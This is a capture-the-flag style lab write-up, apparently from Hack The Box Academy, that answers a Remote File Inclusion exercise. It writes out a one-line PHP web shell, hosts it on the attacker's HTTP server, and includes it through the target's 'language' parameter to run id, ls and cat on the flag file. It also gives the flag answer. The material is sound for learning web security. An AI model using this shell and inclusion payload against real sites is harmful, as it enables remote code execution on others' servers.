# Section 06: Remote File Inclusion (RFI)

Module: 20. File Inclusion

---

## Questions & Answers

### 1. Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /

Context:
- Prepare for the exploit
```bash
┌─[eu-academy-2]─[10.10.15.146]─[htb-ac-2162140@htb-pwrdcnac6c-htb-cloud-com]─[~]
└──╼ [★]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
┌─[eu-academy-2]─[10.10.15.146]─[htb-ac-2162140@htb-pwrdcnac6c-htb-cloud-com]─[~]
└──╼ [★]$ sudo python3 -m http.server 8080
```
- Exploit:
```
/index.php?language=http://10.10.15.146:8080/shell.php&cmd=id

 uid=33(www-data) gid=33(www-data) groups=33(www-data) 

/index.php?language=http://10.10.15.146:8080/shell.php&cmd=ls /
bin boot dev etc exercise home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 

/index.php?language=http://10.10.15.146:8080/shell.php&cmd=cat /exercise/flag.txt
99a8fc05f033f2fc0cf9a6f9826f83f4 
```

**Answer:** `99a8fc05f033f2fc0cf9a6f9826f83f4`

---

[Back to Module Index](./README.md)
